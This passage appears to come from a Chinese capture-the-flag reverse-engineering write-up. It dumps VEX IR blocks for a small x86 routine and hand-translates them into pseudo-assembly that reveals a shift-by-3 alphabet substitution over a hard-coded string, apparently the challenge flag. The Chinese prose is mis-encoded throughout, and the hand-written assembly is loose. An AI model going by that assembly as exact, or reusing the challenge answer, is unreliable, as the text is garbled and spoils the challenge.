        <span class="token keyword">if</span><span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
    file2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¾—åˆ°äº†å¦‚ä¸‹ irsb é›†åˆ,ä¸æƒ³çœ‹çš„è¯å°±å¯ä»¥å¿½ç•¥äº†233,ç›´æ¥è·³è½¬åˆ°ä¸‹é¢</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x8048464
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Sub32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000006
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eip) &#x3D; 0x08048467
0x8048467
   09 | t4 &#x3D; Sub32(t0,0x00000004)
   10 | PUT(esp) &#x3D; t4
   11 | STle(t4) &#x3D; 0x0804846c   # Write a value to memory
   NEXT: PUT(eip) &#x3D; 0x080485f1; Ijk_Call
0x804846c
   01 | t0 &#x3D; GET:I32(eax)
   02 | t2 &#x3D; Add32(t0,0x00001b94)
   03 | PUT(cc_op) &#x3D; 0x00000003
   04 | PUT(cc_dep1) &#x3D; t0
   05 | PUT(cc_dep2) &#x3D; 0x00001b94
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eax) &#x3D; t2
   08 | PUT(eip) &#x3D; 0x08048471
0x8048471
   10 | t51 &#x3D; GET:I16(gs)
   11 | t50 &#x3D; 16Uto32(t51)
   12 | t5 &#x3D; GET:I64(ldt)
   13 | t6 &#x3D; GET:I64(gdt)
   14 | t52 &#x3D; x86g_use_seg_selector(t5,t6,t50,0x00000014):Ity_I64
   15 | t54 &#x3D; 64HIto32(t52)
   16 | t53 &#x3D; CmpNE32(t54,0x00000000)
   17 | if (t53) &#123; PUT(eip) &#x3D; 0x8048471; Ijk_MapFail &#125;
   18 | t55 &#x3D; 64to32(t52)
   19 | t56 &#x3D; LDle:I32(t55)
   20 | PUT(eip) &#x3D; 0x08048477
0x8048477
   22 | t58 &#x3D; GET:I32(ebp)
   23 | t57 &#x3D; Add32(t58,0xfffffff4)
   24 | STle(t57) &#x3D; t56
0x804847a
   26 | PUT(cc_op) &#x3D; 0x0000000f
   27 | PUT(cc_dep1) &#x3D; 0x00000000
   28 | PUT(cc_dep2) &#x3D; 0x00000000
   29 | PUT(cc_ndep) &#x3D; 0x00000000
   30 | PUT(eax) &#x3D; 0x00000000
   31 | PUT(eip) &#x3D; 0x0804847c
0x804847c
   33 | t60 &#x3D; Add32(t58,0xffffffce)
   34 | STle(t60) &#x3D; 0x656d3174
   35 | PUT(eip) &#x3D; 0x08048483
0x8048483
   37 | t62 &#x3D; Add32(t58,0xffffffd2)
   38 | STle(t62) &#x3D; 0x7530795f
   39 | PUT(eip) &#x3D; 0x0804848a
0x804848a
   41 | t64 &#x3D; Add32(t58,0xffffffd6)
   42 | STle(t64) &#x3D; 0x6a6e655f
   43 | PUT(eip) &#x3D; 0x08048491
0x8048491
   45 | t66 &#x3D; Add32(t58,0xffffffda)
   46 | STle(t66) &#x3D; 0x775f7930
   47 | PUT(eip) &#x3D; 0x08048498
0x8048498
   49 | t68 &#x3D; Add32(t58,0xffffffde)
   50 | STle(t68) &#x3D; 0x31743561
   51 | PUT(eip) &#x3D; 0x0804849f
0x804849f
   53 | t70 &#x3D; Add32(t58,0xffffffe2)
   54 | STle(t70) &#x3D; 0x775f676e
   55 | PUT(eip) &#x3D; 0x080484a6
0x80484a6
   57 | t72 &#x3D; Add32(t58,0xffffffe6)
   58 | STle(t72) &#x3D; 0x6e5f3561
   59 | PUT(eip) &#x3D; 0x080484ad
0x80484ad
   61 | t74 &#x3D; Add32(t58,0xffffffea)
   62 | STle(t74) &#x3D; 0x775f746f
   63 | PUT(eip) &#x3D; 0x080484b4
0x80484b4
   65 | t76 &#x3D; Add32(t58,0xffffffee)
   66 | STle(t76) &#x3D; 0x65743561
   67 | PUT(eip) &#x3D; 0x080484bb
0x80484bb
   69 | t78 &#x3D; Add32(t58,0xfffffff2)
   70 | STle(t78) &#x3D; 0x0064
   71 | PUT(eip) &#x3D; 0x080484c1
0x80484c1
   73 | t80 &#x3D; Add32(t58,0xffffffac)
   74 | STle(t80) &#x3D; 0x00000003
   75 | PUT(eip) &#x3D; 0x080484c8
0x80484c8
   77 | t82 &#x3D; Add32(t58,0xffffffb4)
   78 | STle(t82) &#x3D; 0x41
   79 | PUT(eip) &#x3D; 0x080484cc
0x80484cc
   81 | t84 &#x3D; Add32(t58,0xffffffb5)
   82 | STle(t84) &#x3D; 0x42
   83 | PUT(eip) &#x3D; 0x080484d0
0x80484d0
   85 | t86 &#x3D; Add32(t58,0xffffffb6)
   86 | STle(t86) &#x3D; 0x43
   87 | PUT(eip) &#x3D; 0x080484d4
0x80484d4
   89 | t88 &#x3D; Add32(t58,0xffffffb7)
   90 | STle(t88) &#x3D; 0x44
   91 | PUT(eip) &#x3D; 0x080484d8
0x80484d8
   93 | t90 &#x3D; Add32(t58,0xffffffb8)
   94 | STle(t90) &#x3D; 0x45
   95 | PUT(eip) &#x3D; 0x080484dc
0x80484dc
   97 | t92 &#x3D; Add32(t58,0xffffffb9)
   98 | STle(t92) &#x3D; 0x46
   99 | PUT(eip) &#x3D; 0x080484e0
0x80484e0
   101 | t94 &#x3D; Add32(t58,0xffffffba)
   102 | STle(t94) &#x3D; 0x47
   103 | PUT(eip) &#x3D; 0x080484e4
0x80484e4
   105 | t96 &#x3D; Add32(t58,0xffffffbb)
   106 | STle(t96) &#x3D; 0x48
   107 | PUT(eip) &#x3D; 0x080484e8
0x80484e8
   109 | t98 &#x3D; Add32(t58,0xffffffbc)
   110 | STle(t98) &#x3D; 0x49
   111 | PUT(eip) &#x3D; 0x080484ec
0x80484ec
   113 | t100 &#x3D; Add32(t58,0xffffffbd)
   114 | STle(t100) &#x3D; 0x4a
   115 | PUT(eip) &#x3D; 0x080484f0
0x80484f0
   117 | t102 &#x3D; Add32(t58,0xffffffbe)
   118 | STle(t102) &#x3D; 0x4b
   119 | PUT(eip) &#x3D; 0x080484f4
0x80484f4
   121 | t104 &#x3D; Add32(t58,0xffffffbf)
   122 | STle(t104) &#x3D; 0x4c
   123 | PUT(eip) &#x3D; 0x080484f8
0x80484f8
   125 | t106 &#x3D; Add32(t58,0xffffffc0)
   126 | STle(t106) &#x3D; 0x4d
   127 | PUT(eip) &#x3D; 0x080484fc
0x80484fc
   129 | t108 &#x3D; Add32(t58,0xffffffc1)
   130 | STle(t108) &#x3D; 0x4e
   131 | PUT(eip) &#x3D; 0x08048500
0x8048500
   133 | t110 &#x3D; Add32(t58,0xffffffc2)
   134 | STle(t110) &#x3D; 0x4f
   135 | PUT(eip) &#x3D; 0x08048504
0x8048504
   137 | t112 &#x3D; Add32(t58,0xffffffc3)
   138 | STle(t112) &#x3D; 0x50
   139 | PUT(eip) &#x3D; 0x08048508
0x8048508
   141 | t114 &#x3D; Add32(t58,0xffffffc4)
   142 | STle(t114) &#x3D; 0x51
   143 | PUT(eip) &#x3D; 0x0804850c
0x804850c
   145 | t116 &#x3D; Add32(t58,0xffffffc5)
   146 | STle(t116) &#x3D; 0x52
   147 | PUT(eip) &#x3D; 0x08048510
0x8048510
   149 | t118 &#x3D; Add32(t58,0xffffffc6)
   150 | STle(t118) &#x3D; 0x53
   151 | PUT(eip) &#x3D; 0x08048514
0x8048514
   153 | t120 &#x3D; Add32(t58,0xffffffc7)
   154 | STle(t120) &#x3D; 0x54
   155 | PUT(eip) &#x3D; 0x08048518
0x8048518
   157 | t122 &#x3D; Add32(t58,0xffffffc8)
   158 | STle(t122) &#x3D; 0x55
   159 | PUT(eip) &#x3D; 0x0804851c
0x804851c
   161 | t124 &#x3D; Add32(t58,0xffffffc9)
   162 | STle(t124) &#x3D; 0x56
   163 | PUT(eip) &#x3D; 0x08048520
0x8048520
   165 | t126 &#x3D; Add32(t58,0xffffffca)
   166 | STle(t126) &#x3D; 0x57
   167 | PUT(eip) &#x3D; 0x08048524
0x8048524
   169 | t128 &#x3D; Add32(t58,0xffffffcb)
   170 | STle(t128) &#x3D; 0x58
   171 | PUT(eip) &#x3D; 0x08048528
0x8048528
   173 | t130 &#x3D; Add32(t58,0xffffffcc)
   174 | STle(t130) &#x3D; 0x59
   175 | PUT(eip) &#x3D; 0x0804852c
0x804852c
   177 | t132 &#x3D; Add32(t58,0xffffffcd)
   178 | STle(t132) &#x3D; 0x5a
   179 | PUT(eip) &#x3D; 0x08048530
0x8048530
   181 | t134 &#x3D; Add32(t58,0xffffffa8)
   182 | STle(t134) &#x3D; 0x00000000
0x8048537
   NEXT: PUT(eip) &#x3D; 0x080485c8; Ijk_Boring
0x804853c
   01 | t14 &#x3D; GET:I32(ebp)
   02 | t13 &#x3D; Add32(t14,0xffffffce)
   03 | PUT(eip) &#x3D; 0x0804853f
0x804853f
   05 | t15 &#x3D; Add32(t14,0xffffffa8)
   06 | t17 &#x3D; LDle:I32(t15)
0x8048542
   08 | t2 &#x3D; Add32(t17,t13)
   09 | PUT(eip) &#x3D; 0x08048544
0x8048544
   11 | t19 &#x3D; LDle:I8(t2)
   12 | t32 &#x3D; 8Uto32(t19)
   13 | t18 &#x3D; t32
   14 | PUT(eax) &#x3D; t18
0x8048547
   16 | t21 &#x3D; GET:I8(al)
   17 | t33 &#x3D; 8Sto32(t21)
   18 | t20 &#x3D; t33
   19 | PUT(edx) &#x3D; t20
   20 | PUT(eip) &#x3D; 0x0804854a
0x804854a
   22 | t22 &#x3D; Add32(t14,0xffffffac)
   23 | t24 &#x3D; LDle:I32(t22)
0x804854d
   25 | t7 &#x3D; Add32(t24,t20)
   26 | PUT(eax) &#x3D; t7
0x804854f
   28 | PUT(cc_op) &#x3D; 0x00000006
   29 | PUT(cc_dep1) &#x3D; t7
   30 | PUT(cc_dep2) &#x3D; 0x0000005a
   31 | PUT(cc_ndep) &#x3D; 0x00000000
   32 | PUT(eip) &#x3D; 0x08048552
0x8048552
   34 | t35 &#x3D; CmpLE32S(t7,0x0000005a)
   35 | t34 &#x3D; 1Uto32(t35)
   36 | t30 &#x3D; t34
   37 | t36 &#x3D; 32to1(t30)
   38 | t25 &#x3D; t36
   39 | if (t25) &#123; PUT(eip) &#x3D; 0x8048554; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x08048574; Ijk_Boring
0x8048554
   01 | t17 &#x3D; GET:I32(ebp)
   02 | t16 &#x3D; Add32(t17,0xffffffce)
   03 | PUT(eip) &#x3D; 0x08048557
0x8048557
   05 | t18 &#x3D; Add32(t17,0xffffffa8)
   06 | t20 &#x3D; LDle:I32(t18)
0x804855a
   08 | t2 &#x3D; Add32(t20,t16)
   09 | PUT(eip) &#x3D; 0x0804855c
0x804855c
   11 | t22 &#x3D; LDle:I8(t2)
   12 | t21 &#x3D; 8Uto32(t22)
0x804855f
   14 | PUT(eip) &#x3D; 0x08048561
0x8048561
   16 | t24 &#x3D; Add32(t17,0xffffffac)
   17 | t26 &#x3D; LDle:I32(t24)
0x8048564
   19 | t7 &#x3D; Add32(t26,t21)
0x8048566
   21 | PUT(ecx) &#x3D; t7
0x8048568
   23 | t28 &#x3D; Add32(t17,0xffffffce)
   24 | PUT(edx) &#x3D; t28
   25 | PUT(eip) &#x3D; 0x0804856b
0x804856b
   27 | t30 &#x3D; Add32(t17,0xffffffa8)
   28 | t32 &#x3D; LDle:I32(t30)
0x804856e
   30 | t12 &#x3D; Add32(t32,t28)
   31 | PUT(cc_op) &#x3D; 0x00000003
   32 | PUT(cc_dep1) &#x3D; t32
   33 | PUT(cc_dep2) &#x3D; t28
   34 | PUT(cc_ndep) &#x3D; 0x00000000
   35 | PUT(eax) &#x3D; t12
   36 | PUT(eip) &#x3D; 0x08048570
0x8048570
   38 | t33 &#x3D; GET:I8(cl)
   39 | STle(t12) &#x3D; t33
0x8048572
   NEXT: PUT(eip) &#x3D; 0x080485c4; Ijk_Boring
0x8048574
   01 | t63 &#x3D; GET:I32(ebp)
   02 | t62 &#x3D; Add32(t63,0xffffffce)
   03 | PUT(eip) &#x3D; 0x08048577
0x8048577
   05 | t64 &#x3D; Add32(t63,0xffffffa8)
   06 | t66 &#x3D; LDle:I32(t64)
0x804857a
   08 | t2 &#x3D; Add32(t66,t62)
   09 | PUT(eip) &#x3D; 0x0804857c
0x804857c
   11 | t68 &#x3D; LDle:I8(t2)
   12 | t140 &#x3D; 8Uto32(t68)
   13 | t67 &#x3D; t140
   14 | PUT(eax) &#x3D; t67
0x804857f
   16 | t70 &#x3D; GET:I8(al)
   17 | t141 &#x3D; 8Sto32(t70)
   18 | t69 &#x3D; t141
   19 | PUT(eip) &#x3D; 0x08048582
0x8048582
   21 | t71 &#x3D; Add32(t63,0xffffffac)
   22 | t73 &#x3D; LDle:I32(t71)
0x8048585
   24 | t7 &#x3D; Add32(t73,t69)
0x8048587
   26 | t74 &#x3D; Add32(t7,0xffffffa6)
0x804858a
0x804858f
0x8048591
   30 | t14 &#x3D; MullS32(t74,0x4ec4ec4f)
   31 | t142 &#x3D; 64HIto32(t14)
   32 | t77 &#x3D; t142
0x8048593
   34 | t20 &#x3D; Sar32(t77,0x03)
0x8048596
0x8048598
   37 | t27 &#x3D; Sar32(t74,0x1f)
0x804859b
   39 | t31 &#x3D; Sub32(t20,t27)
0x804859d
   41 | PUT(eip) &#x3D; 0x0804859f
0x804859f
   43 | t103 &#x3D; Add32(t63,0xffffffb0)
   44 | STle(t103) &#x3D; t31
   45 | PUT(eip) &#x3D; 0x080485a2
0x80485a2
   47 | t106 &#x3D; Add32(t63,0xffffffb0)
   48 | t108 &#x3D; LDle:I32(t106)
0x80485a5
   50 | t38 &#x3D; Mul32(t108,0x0000001a)
0x80485a8
   52 | t39 &#x3D; Sub32(t74,t38)
0x80485aa
   54 | PUT(eip) &#x3D; 0x080485ac
0x80485ac
   56 | t110 &#x3D; Add32(t63,0xffffffb0)
   57 | STle(t110) &#x3D; t39
   58 | PUT(eip) &#x3D; 0x080485af
0x80485af
   60 | t113 &#x3D; Add32(t63,0xffffffb0)
   61 | t115 &#x3D; LDle:I32(t113)
0x80485b2
   63 | t44 &#x3D; Sub32(t115,0x00000001)
   64 | PUT(eip) &#x3D; 0x080485b5
0x80485b5
   66 | t117 &#x3D; Add32(t63,t44)
   67 | t116 &#x3D; Add32(t117,0xffffffb4)
   68 | t122 &#x3D; LDle:I8(t116)
   69 | t143 &#x3D; 8Uto32(t122)
   70 | t121 &#x3D; t143
   71 | PUT(eax) &#x3D; t121
0x80485ba
   73 | t123 &#x3D; Add32(t63,0xffffffce)
   74 | PUT(ecx) &#x3D; t123
   75 | PUT(eip) &#x3D; 0x080485bd
0x80485bd
   77 | t125 &#x3D; Add32(t63,0xffffffa8)
   78 | t127 &#x3D; LDle:I32(t125)
0x80485c0
   80 | t50 &#x3D; Add32(t127,t123)
   81 | PUT(edx) &#x3D; t50
   82 | PUT(eip) &#x3D; 0x080485c2
0x80485c2
   84 | t128 &#x3D; GET:I8(al)
   85 | STle(t50) &#x3D; t128
   86 | PUT(eip) &#x3D; 0x080485c4
0x80485c4
   88 | t129 &#x3D; Add32(t63,0xffffffa8)
   89 | t56 &#x3D; LDle:I32(t129)
   90 | t54 &#x3D; Add32(t56,0x00000001)
   91 | STle(t129) &#x3D; t54
   92 | PUT(eip) &#x3D; 0x080485c8

0x80485c8
   01 | t5 &#x3D; GET:I32(ebp)
   02 | t4 &#x3D; Add32(t5,0xffffffa8)
   03 | t2 &#x3D; LDle:I32(t4)           #A load from memory
   04 | PUT(cc_op) &#x3D; 0x00000006
   05 | PUT(cc_dep1) &#x3D; t2
   06 | PUT(cc_dep2) &#x3D; 0x00000024
   07 | PUT(cc_ndep) &#x3D; 0x00000000
   08 | PUT(eip) &#x3D; 0x080485cc
0x80485cc
   10 | t14 &#x3D; CmpLE32S(t2,0x00000024)
   11 | t13 &#x3D; 1Uto32(t14)
   12 | t11 &#x3D; t13
   13 | t15 &#x3D; 32to1(t11)
   14 | t6 &#x3D; t15
   15 | if (t6) &#123; PUT(eip) &#x3D; 0x804853c; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x080485d2; Ijk_Boring
0x80485d2
   01 | PUT(eax) &#x3D; 0x00000000
   02 | PUT(eip) &#x3D; 0x080485d7
0x80485d7
   04 | t10 &#x3D; GET:I32(ebp)
   05 | t9 &#x3D; Add32(t10,0xfffffff4)
   06 | t11 &#x3D; LDle:I32(t9)
   07 | PUT(ecx) &#x3D; t11
   08 | PUT(eip) &#x3D; 0x080485da
0x80485da
   10 | t13 &#x3D; GET:I16(gs)
   11 | t25 &#x3D; 16Uto32(t13)
   12 | t12 &#x3D; t25
   13 | t5 &#x3D; GET:I64(ldt)
   14 | t6 &#x3D; GET:I64(gdt)
   15 | t26 &#x3D; x86g_use_seg_selector(t5,t6,t12,0x00000014):Ity_I64
   16 | t14 &#x3D; t26
   17 | t27 &#x3D; 64HIto32(t14)
   18 | t16 &#x3D; t27
   19 | t15 &#x3D; CmpNE32(t16,0x00000000)
   20 | if (t15) &#123; PUT(eip) &#x3D; 0x80485da; Ijk_MapFail &#125;
   21 | t28 &#x3D; 64to32(t14)
   22 | t17 &#x3D; t28
   23 | t2 &#x3D; LDle:I32(t17)
   24 | t1 &#x3D; Xor32(t11,t2)
   25 | PUT(cc_op) &#x3D; 0x0000000f
   26 | PUT(cc_dep1) &#x3D; t1
   27 | PUT(cc_dep2) &#x3D; 0x00000000
   28 | PUT(cc_ndep) &#x3D; 0x00000000
   29 | PUT(ecx) &#x3D; t1
   30 | PUT(eip) &#x3D; 0x080485e1
0x80485e1
   32 | t30 &#x3D; CmpEQ32(t1,0x00000000)
   33 | t29 &#x3D; 1Uto32(t30)
   34 | t23 &#x3D; t29
   35 | t31 &#x3D; 32to1(t23)
   36 | t18 &#x3D; t31
   37 | if (t18) &#123; PUT(eip) &#x3D; 0x80485e8; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x080485e3; Ijk_Boring
0x80485e8
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Add32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000003
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(esp) &#x3D; t0
   08 | PUT(eip) &#x3D; 0x080485eb
0x80485eb
   10 | t3 &#x3D; LDle:I32(t0)
   11 | t10 &#x3D; Add32(t0,0x00000004)
   12 | PUT(esp) &#x3D; t10
   13 | PUT(ecx) &#x3D; t3
   14 | PUT(eip) &#x3D; 0x080485ec
0x80485ec
   16 | t5 &#x3D; LDle:I32(t10)
   17 | PUT(ebp) &#x3D; t5
0x80485ed
   19 | t12 &#x3D; Add32(t3,0xfffffffc)
   20 | PUT(esp) &#x3D; t12
   21 | PUT(eip) &#x3D; 0x080485f0
0x80485f0
   23 | t9 &#x3D; LDle:I32(t12)
   24 | t14 &#x3D; Add32(t12,0x00000004)
   25 | PUT(esp) &#x3D; t14
   NEXT: PUT(eip) &#x3D; t9; Ijk_Ret
0x80485f1
   01 | t0 &#x3D; GET:I32(esp)
   02 | t3 &#x3D; LDle:I32(t0)
   03 | PUT(eax) &#x3D; t3
   04 | PUT(eip) &#x3D; 0x080485f4
0x80485f4
   06 | t2 &#x3D; LDle:I32(t0)
   07 | t4 &#x3D; Add32(t0,0x00000004)
   08 | PUT(esp) &#x3D; t4
   NEXT: PUT(eip) &#x3D; t2; Ijk_Ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="æˆ‘ä»¬å¯ä»¥æ ¹æ®è¯­ä¹‰ï¼Œå»åˆ†ææ¯ä¸€æ®µblockåšäº†ä»€ä¹ˆï¼Œè·³è½¬åˆ°å“ªé‡Œã€‚"><a href="#æˆ‘ä»¬å¯ä»¥æ ¹æ®è¯­ä¹‰ï¼Œå»åˆ†ææ¯ä¸€æ®µblockåšäº†ä»€ä¹ˆï¼Œè·³è½¬åˆ°å“ªé‡Œã€‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥æ ¹æ®è¯­ä¹‰ï¼Œå»åˆ†ææ¯ä¸€æ®µblockåšäº†ä»€ä¹ˆï¼Œè·³è½¬åˆ°å“ªé‡Œã€‚"></a>æˆ‘ä»¬å¯ä»¥æ ¹æ®è¯­ä¹‰ï¼Œå»åˆ†ææ¯ä¸€æ®µblockåšäº†ä»€ä¹ˆï¼Œè·³è½¬åˆ°å“ªé‡Œã€‚</h3><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å€’è¿‡æ¥å†™æ±‡ç¼–ï¼Œæ¯•ç«Ÿå°±åªæœ‰ 110 è¡Œå·¦å³çš„æ±‡ç¼–ã€‚</p>
<p>è¯´åˆ°åº•ï¼Œå…¶å®æˆ‘ä»¬å°±æ˜¯äººå·¥åšäº†è¯­æ³•åˆ†æçš„é€»è¾‘ã€‚<br>ä»¥ä¸‹æ˜¯æˆ‘å†™çš„ä¼ªä»£ç ã€‚æµ“ç¼©åˆ°110è¡Œäº†ã€‚ç›´æ¥çœ‹ irsb ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œç”šè‡³æˆ‘è¿™ç§äººè‚‰åæ±‡ç¼–å…¶å®æ˜¯æ¯”è¾ƒæµªè´¹æ—¶é—´çš„ã€‚</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0x8048464   sub esp,0x58
0x8048467   mov [esp],0x0804846c -&gt; call 0x804846c # å†™åœ°å€ CALL
0x804846c   add eax,0x1b94
0x8048471   
0x8048477   mov [ebp-0x0C],[x86g_use_seg_selector(t5,t6,t50,0x00000014)]
0x804847a   mov eax,0
0x804847c   mov.d [ebp-0x32],0x656d3174
0x8048483   mov.d [ebp-0x2E],0x7530795f
0x804848a   mov.d [ebp-0x2A],0x6a6e655f
...
0x80484b4   mov.d [ebp-0x12],0x65743561
0x80484bb   mov.w [ebp-0x0E],0x0064
0x80484c1   mov.d [ebp-0x54],0x00000003
0x80484c8   mov.b [ebp-0x4C],0x41
0x80484cc   mov.b [ebp-0x4B],0x42
...
0x804852c   mov.b [ebp-0x33],0x5a
0x8048530   mov.d [ebp-0x58],0x00000000
0x8048537   jmp 0x80485c8-----------------------------|


0x804853c   lea edx,[ebp-0x32]&lt;-------|   # add a2,[ebp-0x58],ebp-0x32
0x804853f   mov.d eax,[ebp-0x58]
0x8048542   add eax,edx
0x8048544   mov.b eax,[eax]
0x8048547   mov edx,al                  # get a byte
0x804854a   mov eax,[ebp-0x54]          # æ‰€æœ‰çš„éƒ½ä¼šä½ç§»3
0x804854d   add eax,edx
0x804854f   cmp eax,0x0000005a
0x8048552   jle 0x8048554---------------| jmp  0x8048574            

0x8048554   lea edx,[ebp-0x32]                            
0x8048557   mov eax,[ebp-0x58]
0x804855a   add edx,eax
0x804855c   mov.bb al,[edx]
0x804855f                               #ä½ç§»3
0x8048561   mov t26,[ebp-0x54]
0x8048564   add t7,t26,eax
0x8048566   mov ecx,t7
0x8048568   lea edx,[ebp-0x32]
0x804856b   
0x804856e   mov eax,(edx+[ebp-0x58])
0x8048570   mov [eax],cl
0x8048572   jmp 0x80485c4

                                        |
                                        |
0x8048574   lea edx,[ebp-0x32]&lt;---------|
0x8048577   mov ecx,[ebp-0x58]
0x804857a   add ecx,edx
0x804857c   mov.b ecx,[ecx]
0x804857f   mov edx,al                  #(al+3-0x5A)*0x4ec4ec4f&gt;&gt;3
0x8048582   mov ecx,[ebp-0x54]
0x8048585   add ecx,edx
0x8048587   sub ecx,0x5A
0x8048591   mul 0x4ec4ec4f              # ecx &#x3D; (I32high)(rcx*0x4ec4ec4f)
0x8048593   shr ecx,0x3
0x8048596   mov edx,[ebp-0x54]
0x8048598   shr edx,0x1f
0x804859b   sub edx,eax
0x804859d   jmp 0x0804859f              
0x804859f   [ebp-0x50],edx
0x80485a2   mov eax,[ebp-0x50]          #eax&#x3D;eax*0x0000001a
0x80485a5   mul 0x0000001a
0x80485a8   sub ecx,eax
0x80485aa   nop
0x80485ac   mov [ebp-0x50],ecx
0x80485af   mov ecx,[ebp-0x50]
0x80485b2   sub ecx,0x00000001
0x80485b5   mov.b eax,[ebp+ecx-0x4C]  # æ ¹æ® ecx æŸ¥è¡¨
0x80485ba   lea ecx,[ebp-0x32]
0x80485bd   mov t127,[ebp-0x58]
0x80485c0   mov edx,t127+ecx
0x80485c2   mov.b [edx],eax
0x80485c4   add [ebp-0x58],0x1---------|
